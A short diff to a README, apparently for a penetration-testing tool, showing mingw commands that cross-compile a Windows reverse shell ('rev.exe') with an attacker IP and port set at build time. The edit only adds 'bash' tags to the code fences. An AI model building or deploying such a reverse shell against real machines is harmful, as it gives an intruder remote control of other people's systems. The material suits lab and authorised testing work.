@@ -6,7 +6,7 @@ To compile on Kali
 
 
 
-```
+```bash
 apt install mingw-w64-i686-dev
 apt install mingw-w64
 i686-w64-mingw32-g++ rev.c -o build/rev.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -DIP=\"10.10.10.10\" -DPORT=8080
@@ -15,7 +15,7 @@ I've moved the IP address out of the source file into the -D switch.
 
 Or use the makefile (you still need to install the require stuff from above.)
 
-```
+```bash
 make ATTK_HOST=10.10.10.10 ATTK_PORT=8080
 ```
 
